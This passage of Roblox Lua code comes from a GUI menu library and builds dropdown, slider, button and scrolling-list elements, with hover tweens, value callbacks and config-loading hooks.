									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

									local num = #data.options 
									if num > 5 then 
										Drop.Size = C.UDIM2(1, 0, 0, 85) 
									else 
										Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
									end 
									Drop.CanvasSize = C.UDIM2(1, 0, 0, 17*num) 
									local first = true 

									for i,v in ipairs(data.options) do 
										do 
											local Button = C.INST("TextButton") 
											local TextLabel = C.INST("TextLabel") 

											Button.Name = v 
											Button.Parent = Drop 
											Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
											Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
											Button.Position = C.UDIM2(0, 30, 0, 16) 
											Button.Size = C.UDIM2(0, 175, 0, 17) 
											Button.AutoButtonColor = false 
											Button.Font = Enum.Font.SourceSans 
											Button.Text = "" 
											Button.TextColor3 = C.COL3RGB(0, 0, 0) 
											Button.TextSize = 11.000
											Button.BorderSizePixel = 0 
											Button.ZIndex = 6 

											TextLabel.Parent = Button 
											TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
											TextLabel.BackgroundTransparency = 1.000 
											TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
											TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
											TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
											TextLabel.Font = Enum.Font.Gotham 
											TextLabel.Text = v 
											TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											TextLabel.TextSize = 11.000
											TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
											TextLabel.ZIndex = 6 

											Button.MouseButton1Down:Connect(function() 
												Drop.Visible = false 
												Element.value.Dropdown = v 
												abcd.Text = v 
												values[tabname][sectorname][tabtext][text] = Element.value 
												callback(Element.value) 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end) 
											Button.MouseEnter:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  MainUIColor}) 
											end) 
											Button.MouseLeave:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
											end) 

											first = false 
										end 
									end 

									function Element:SetValue(val) 
										Element.value = val 
										abcd.Text = val.Dropdown 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(val) 
									end 

									ImageLabel.Parent = Button 
									ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ImageLabel.BackgroundTransparency = 1.000 
									ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
									ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
									ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

									TextLabel_3.Parent = Dropdown 
									TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel_3.BackgroundTransparency = 1.000 
									TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
									TextLabel_3.Font = Enum.Font.Gotham 
									TextLabel_3.Text = text 
									TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel_3.TextSize = 11.000
									TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

									Button.MouseButton1Down:Connect(function() 
										Drop.Visible = not Drop.Visible 
										if not Drop.Visible then 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end) 
									local indrop = false 
									local ind = false 
									Drop.MouseEnter:Connect(function() 
										indrop = true 
									end) 
									Drop.MouseLeave:Connect(function() 
										indrop = false 
									end) 
									Button.MouseEnter:Connect(function() 
										ind = true 
									end) 
									Button.MouseLeave:Connect(function() 
										ind = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if Drop.Visible == true and not indrop and not ind then 
												Drop.Visible = false 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end 
										end 
									end) 
									values[tabname][sectorname][tabtext][text] = Element.value 
									
									
									
									
									
					
									
									
									
									
									
									
								elseif type == "Slider" then 

									tabsize = tabsize + C.UDIM2(0,0,0,25) 

								local Slider = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 
								local Button = C.INST("TextButton") 
								local Frame = C.INST("Frame") 
								local UIGradient = C.INST("UIGradient") 
								local Value = C.INST("TextLabel") 

								Slider.Name = "Slider" 
								Slider.Parent = tab1 
								Slider.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Slider.BackgroundTransparency = 1.000 
								Slider.Position = C.UDIM2(0, 0, 0.653061211, 0) 
								Slider.Size = C.UDIM2(1, 0, 0, 25) 

								TextLabel.Parent = Slider 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -2) 
								TextLabel.Size = C.UDIM2(0, 100, 0, 15) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								Button.Name = "Button" 
								Button.Parent = Slider 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 15) 
								Button.Size = C.UDIM2(0, 175, 0, 5) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Frame.Parent = Button 
								Frame.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Frame.BorderSizePixel = 0 
								Frame.Size = C.UDIM2(0.5, 0, 1, 0) 
								
								UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, MainUIColor), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
								
								
								UIGradient.Rotation = 90
								UIGradient.Parent = Frame


								Value.Name = "Value" 
								Value.Parent = Slider 
								Value.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Value.BackgroundTransparency = 1.000 
								Value.Position = C.UDIM2(0, 30, 0, 15) 
								Value.Size = C.UDIM2(0, 175, 0, 5)  
								Value.Font = Enum.Font.Gotham 
								Value.Text = "50" 
								Value.TextStrokeTransparency = 0.000
								Value.TextColor3 = C.COL3RGB(200, 200, 200) 
								Value.TextSize = 11.000 
								local min, max, default = data.min or 0, data.max or 100, data.default or 0 
								Element.value = {Slider = default} 

								function Element:SetValue(value) 
									Element.value = value 
									local a 
									if min > 0 then 
										a = ((Element.value.Slider - min)) / (max-min) 
									else 
										a = (Element.value.Slider-min)/(max-min) 
									end 
									Value.Text = Element.value.Slider 
									Frame.Size = C.UDIM2(a,0,1,0) 
									values[tabname][sectorname][tabtext][text] = Element.value 
									callback(value) 
								end 
								local a 
								if min > 0 then 
									a = ((Element.value.Slider - min)) / (max-min) 
								else 
									a = (Element.value.Slider-min)/(max-min) 
								end 
								Value.Text = Element.value.Slider 
								Frame.Size = C.UDIM2(a,0,1,0) 
								values[tabname][sectorname][tabtext][text] = Element.value 
								local uis = game:GetService('UserInputService')
								local mouse = game.Players.LocalPlayer:GetMouse() 
								local val 
								Button.MouseButton1Down:Connect(function() 
									Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
									val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min)) or 0 
									Value.Text = val 
									Element.value.Slider = val 
									values[tabname][sectorname][tabtext][text] = Element.value 
									callback(Element.value) 
									moveconnection = mouse.Move:Connect(function() 
										Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
										val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min)) 
										Value.Text = val 
										Element.value.Slider = val 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end) 
									releaseconnection = uis.InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
											val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min)) 
											values[tabname][sectorname][tabtext][text] = Element.value 
											callback(Element.value) 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 
								elseif type == "Button" then 

									tabsize = tabsize + C.UDIM2(0,0,0,24) 
									local Button = C.INST("Frame") 
									local Button_2 = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 

									Button.Name = "Button" 
									Button.Parent = tab1 
									Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button.BackgroundTransparency = 1.000 
									Button.Position = C.UDIM2(0, 0, 0.236059487, 0) 
									Button.Size = C.UDIM2(1, 0, 0, 24) 

									Button_2.Name = "Button" 
									Button_2.Parent = Button 
									Button_2.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button_2.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button_2.Position = C.UDIM2(0, 30, 0.5, -9) 
									Button_2.Size = C.UDIM2(0, 175, 0, 18) 
									Button_2.AutoButtonColor = false 
									Button_2.Font = Enum.Font.SourceSans 
									Button_2.Text = "" 
									Button_2.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button_2.TextSize = 11.000

									TextLabel.Parent = Button_2 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Size = C.UDIM2(1, 0, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = text 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000

									function Element:SetValue() 
									end 

									Button_2.MouseButton1Down:Connect(function() 
										TextLabel.TextColor3 = MainUIColor 
										library:Tween(TextLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										local lmfaooo, lol = pcall(function()
										callback(TextLabel, TextLabel.Text)
											end)
										if lmfaooo then
										TextLabel.Text = 'Success!'
										wait(1)
										TextLabel.Text = text
										else 
										TextLabel.Text = 'Error!'
										wait(1)
										TextLabel.Text = text
										print(lol)
										end
									end) 
									Button_2.MouseEnter:Connect(function() 
										library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									end) 
									Button_2.MouseLeave:Connect(function() 
										library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end) 
								end 
								ConfigLoad:Connect(function(cfg) 
									local fix = library:ConfigFix(cfg) 
									if fix[tabname][sectorname][tabtext][text] ~= nil then 
										Element:SetValue(fix[tabname][sectorname][tabtext][text]) 
									end 
								end)
								ConfigLoad1:Connect(function(cfg)
									local fix = library:ConfigFix1(cfg) 
									if fix[tabname][sectorname][tabtext][text] ~= nil then 
										Element:SetValue(fix[tabname][sectorname][tabtext][text]) 
									end 
								end)

								return Element 
							end 


							if firs then 
								coroutine.wrap(function() 
									game:GetService('RunService').RenderStepped:Wait() 
									Section.Size = tabsize 
								end)() 
								selected = text 
								TextButton.TextColor3 = C.COL3RGB(255,255,255) 
								tab1.Visible = true 
								firs = false 
							end 

							return tab 
						end 
						library.tabs[tabname][sectorname] = MSector
						return MSector 
					end 
					function Tab:Sector(text, side) 
						local sectorname = text 
						local Sector = {} 
						values[tabname][text] = {} 
						local Section = C.INST("Frame") 
						local SectionText = C.INST("TextLabel") 
						local Inner = C.INST("Frame") 
						local UIListLayout = C.INST("UIListLayout") 

						Section.Name = "Section" 
						Section.Parent = TabGui[side] 
						Section.BackgroundColor3 = C.COL3RGB(18, 18, 16) 
						Section.BorderColor3 = C.COL3RGB(18, 18, 16) 
						Section.BorderSizePixel = 0 
						Section.Position = C.UDIM2(0.00358422939, 0, 0, 0) 
						Section.Size = C.UDIM2(1, 0, 0, 22) 

						SectionText.Name = "SectionText" 
						SectionText.Parent = Section 
						SectionText.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
						SectionText.BackgroundTransparency = 1.000 
						SectionText.Position = C.UDIM2(0, 7, 0, -12) 
						SectionText.Size = C.UDIM2(0, 270, 0, 19) 
						SectionText.ZIndex = 2 
						SectionText.Font = Enum.Font.Gotham 
						SectionText.Text = text 
						SectionText.TextColor3 = C.COL3RGB(255, 255, 255) 
						SectionText.TextSize = 12.000 
						SectionText.TextXAlignment = Enum.TextXAlignment.Left 

						Inner.Name = "Inner" 
						Inner.Parent = Section 
						Inner.BackgroundColor3 = C.COL3RGB(30, 30, 30) 
						Inner.BorderColor3 = C.COL3RGB(18, 18, 16) 
						Inner.BorderSizePixel = 0 
						Inner.Position = C.UDIM2(0, 1, 0, 1) 
						Inner.Size = C.UDIM2(1, -2, 1, -2) 

						local UIPadding = C.INST("UIPadding") 

						UIPadding.Parent = Inner 
						UIPadding.PaddingTop = UDim.new(0, 10) 

						UIListLayout.Parent = Inner 
						UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
						UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
						UIListLayout.Padding = UDim.new(0,1) 

						function Sector:Element(type, text, data, callback) 
							local Element = {} 
							data = data or {} 
							callback = callback or function() end 
							values[tabname][sectorname][text] = {} 
							if type == "ScrollDrop" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,39) 
								Element.value = {Scroll = {}, Dropdown = ""} 

								for i,v in pairs(data.options) do 
									Element.value.Scroll[i] = v[1] 
								end 

								local joe = {} 
								if data.alphabet then 
									local copy = {} 
									for i,v in pairs(data.options) do 
										C.INSERT(copy, i) 
									end 
									C.TBLSORT(copy, function(a,b) 
										return a < b 
									end) 
									joe = copy 
								else 
									for i,v in pairs(data.options) do 
										C.INSERT(joe, i) 
									end 
								end 

								local Dropdown = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 
								local Drop = C.INST("ScrollingFrame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel_2 = C.INST("TextLabel") 
								local UIListLayout = C.INST("UIListLayout") 
								local ImageLabel = C.INST("ImageLabel") 
								local TextLabel_3 = C.INST("TextLabel") 

								Dropdown.Name = "Dropdown" 
								Dropdown.Parent = Inner 
								Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Dropdown.BackgroundTransparency = 1.000 
								Dropdown.Position = C.UDIM2(0, 0, 0, 0) 
								Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

								Button.Name = "Button" 
								Button.Parent = Dropdown 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 16) 
								Button.Size = C.UDIM2(0, 175, 0, 17) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								local TextLabel = C.INST("TextLabel") 

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
								TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = "lol" 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local abcd = TextLabel 

								Drop.Name = "Drop" 
								Drop.Parent = Button 
								Drop.Active = true 
								Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Drop.Position = C.UDIM2(0, 0, 1, 1) 
								Drop.Size = C.UDIM2(1, 0, 0, 20) 
								Drop.Visible = false 
								Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Drop.ScrollBarThickness = 4 
								Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.AutomaticCanvasSize = "Y" 
								Drop.ZIndex = 5 
								Drop.ScrollBarImageColor3 = MainUIColor 
								function MenuAccent(color)
									Drop.ScrollBarImageColor3 = color
								end

								UIListLayout.Parent = Drop 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 


								local amount = data.Amount or 6 
								Section.Size = Section.Size + C.UDIM2(0,0,0,amount * 16 + 8) 

								local num = #joe 
								if num > 5 then 
									Drop.Size = C.UDIM2(1, 0, 0, 85) 
								else 
									Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
								end 
								local first = true 
								for i,v in ipairs(joe) do 
									do 
										local joell = v 
										local Scroll = C.INST("Frame") 
										local joe2 = data.options[v] 
										local Button = C.INST("TextButton") 
										local TextLabel = C.INST("TextLabel") 

										Button.Name = v 
										Button.Parent = Drop 
										Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Button.Position = C.UDIM2(0, 30, 0, 16) 
										Button.Size = C.UDIM2(0, 175, 0, 17) 
										Button.AutoButtonColor = false 
										Button.Font = Enum.Font.SourceSans 
										Button.Text = "" 
										Button.TextColor3 = C.COL3RGB(0, 0, 0) 
										Button.TextSize = 11.000
										Button.BorderSizePixel = 0 
										Button.ZIndex = 6 

										TextLabel.Parent = Button 
										TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										TextLabel.BackgroundTransparency = 1.000 
										TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
										TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
										TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
										TextLabel.Font = Enum.Font.Gotham 
										TextLabel.Text = v 
										TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
										TextLabel.TextSize = 11.000
										TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
										TextLabel.ZIndex = 6 

										Button.MouseButton1Down:Connect(function() 
											Drop.Visible = false 
											Drop.CanvasPosition = C.Vec2(0,0) 
											abcd.Text = v 
											for i,v in pairs(Scroll.Parent:GetChildren()) do 
												if v:IsA("Frame") then 
													v.Visible = false 
												end 
											end 
											Element.value.Dropdown = v 
											Scroll.Visible = true 
											callback(Element.value) 
										end) 
										Button.MouseEnter:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(255, 255, 255)}) 
										end) 
										Button.MouseLeave:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
										end) 

										if first then 
											abcd.Text = v 
											Element.value.Dropdown = v 
										end 
										local Frame = C.INST("ScrollingFrame") 
										local UIListLayout = C.INST("UIListLayout") 

										Scroll.Name = "Scroll" 
										Scroll.Parent = Dropdown 
										Scroll.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										Scroll.BackgroundTransparency = 1.000 
										Scroll.Position = C.UDIM2(0, 0, 0, 0) 
										Scroll.Size = C.UDIM2(1, 0, 0, amount * 16 + 8) 
										Scroll.Visible = first 
										Scroll.Name = v 


										Frame.Name = "Frame"
										Frame.Parent = Scroll 
										Frame.Active = true 
										Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Frame.Position = C.UDIM2(0, 30, 0, 40) 
										Frame.Size = C.UDIM2(0, 175, 0, 16 * amount) 
										Frame.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
										Frame.CanvasSize = C.UDIM2(0, 0, 0, 0) 
										Frame.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
										Frame.ScrollBarThickness = 4 
										Frame.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
										Frame.AutomaticCanvasSize = "Y" 
										Frame.ScrollBarImageColor3 = MainUIColor 
								function MenuAccent(color)
									Frame.ScrollBarImageColor3 = color
								end
										UIListLayout.Parent = Frame 
										UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
										UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
										local joll = true 
										for i,v in ipairs(joe2) do 
											local Button = C.INST("TextButton") 
											local TextLabel = C.INST("TextLabel") 

											Button.Name = v 
											Button.Parent = Frame 
											Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
											Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
											Button.BorderSizePixel = 0 
											Button.Position = C.UDIM2(0, 30, 0, 16) 
											Button.Size = C.UDIM2(1, 0, 0, 16) 
											Button.AutoButtonColor = false 
											Button.Font = Enum.Font.SourceSans 
											Button.Text = "" 
											Button.TextColor3 = C.COL3RGB(0, 0, 0) 
											Button.TextSize = 11.000

											TextLabel.Parent = Button 
											TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
											TextLabel.BackgroundTransparency = 1.000 
											TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
											TextLabel.Position = C.UDIM2(0, 4, 0, -1) 
											TextLabel.Size = C.UDIM2(1, 1, 1, 1) 
											TextLabel.Font = Enum.Font.Gotham 
											TextLabel.Text = v 
											TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											TextLabel.TextSize = 11.000
											TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
											
											if joll then 
												joll = false 
												TextLabel.TextColor3 = MainUIColor
											end 

											Button.MouseButton1Down:Connect(function() 

												for i,v in pairs(Frame:GetChildren()) do 
													if v:IsA("TextButton") then 
														library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
													end 
												end 

												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 

												Element.value.Scroll[joell] = v 

												values[tabname][sectorname][text] = Element.value 
												callback(Element.value) 
											end) 
											Button.MouseEnter:Connect(function() 
												if Element.value.Scroll[joell] ~= v then 
													library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
												end 
											end) 
											Button.MouseLeave:Connect(function() 
												if Element.value.Scroll[joell] ~= v then 
													library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
												end 
											end) 
										end 
										first = false 
									end 
								end 

								ImageLabel.Parent = Button 
								ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ImageLabel.BackgroundTransparency = 1.000 
								ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
								ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
								ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

								TextLabel_3.Parent = Dropdown 
								TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel_3.BackgroundTransparency = 1.000 
								TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
								TextLabel_3.Font = Enum.Font.Gotham 
								TextLabel_3.Text = text 
								TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel_3.TextSize = 11.000
								TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

								Button.MouseButton1Down:Connect(function() 
									Drop.Visible = not Drop.Visible 
									if not Drop.Visible then 
										Drop.CanvasPosition = C.Vec2(0,0) 
									end 
								end) 
								local indrop = false 
								local ind = false 
								Drop.MouseEnter:Connect(function() 
									indrop = true 
								end) 
								Drop.MouseLeave:Connect(function() 
									indrop = false 
								end) 
								Button.MouseEnter:Connect(function() 
									ind = true 
								end) 
								Button.MouseLeave:Connect(function() 
									ind = false 
								end) 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if Drop.Visible == true and not indrop and not ind then 
											Drop.Visible = false 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end 
								end) 

								function Element:SetValue(tbl) 
									Element.value = tbl 
									abcd.Text = tbl.Dropdown 
									values[tabname][sectorname][text] = Element.value 
									for i,v in pairs(Dropdown:GetChildren()) do 
										if v:IsA("Frame") then 
											if v.Name == Element.value.Dropdown then 
												v.Visible = true 
											else 
												v.Visible = false 
											end 
											for _,bad in pairs(v.Frame:GetChildren()) do 
												if bad:IsA("TextButton") then 
													bad.TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
													if bad.Name == Element.value.Scroll[v.Name] then 
														bad.TextLabel.TextColor3 = MainUIColor 
														function MenuAccent(color)
															bad.TextLabel.TextColor3 = color
														end
													end 
												end 
											end 
										end 
									end 
								end 

								if data.default then 
									Element:SetValue(data.default) 
								end 

								values[tabname][sectorname][text] = Element.value 

							elseif type == "Scroll" then 
								local amount = data.Amount or 6 
								Section.Size = Section.Size + C.UDIM2(0,0,0,amount * 16 + 8) 
								if data.alphabet then 
									C.TBLSORT(data.options, function(a,b) 
										return a < b 
									end) 
								end 
								Element.value = {Scroll = data.default and data.default.Scroll or data.options[1]} 

								local Scroll = C.INST("Frame") 
								local Frame = C.INST("ScrollingFrame") 
								local UIListLayout = C.INST("UIListLayout") 

								Scroll.Name = "Scroll" 
								Scroll.Parent = Inner 
								Scroll.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Scroll.BackgroundTransparency = 1.000 
								Scroll.Position = C.UDIM2(0, 0, 00, 0) 
								Scroll.Size = C.UDIM2(1, 0, 0, amount * 16 + 8) 


								Frame.Name = "Frame" 
								Frame.Parent = Scroll --  
								Frame.Active = true 
								Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Frame.Position = C.UDIM2(0, 30, 0, 0) 
								Frame.Size = C.UDIM2(0, 175, 0, 16 * amount) 
								Frame.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Frame.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.ScrollBarThickness = 4 
								Frame.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.AutomaticCanvasSize = "Y" 
								Frame.ScrollBarImageColor3 = MainUIColor 
														function MenuAccent(color)
															Frame.ScrollBarImageColor3 = color
														end
								UIListLayout.Parent = Frame 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
								local first = true 
								for i,v in ipairs(data.options) do 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 

									Button.Name = v 
									Button.Parent = Frame 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.BorderSizePixel = 0 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(1, 0, 0, 16) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 4, 0, -1) 
									TextLabel.Size = C.UDIM2(1, 1, 1, 1) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = v 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
									if first then first = false 
										TextLabel.TextColor3 = MainUIColor
										function MenuAccent(color)
											TextLabel.TextColor3 = MainUIColor
										end								
									end 

									Button.MouseButton1Down:Connect(function() 

										for i,v in pairs(Frame:GetChildren()) do 
											if v:IsA("TextButton") then 
												library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
											end 
										end 

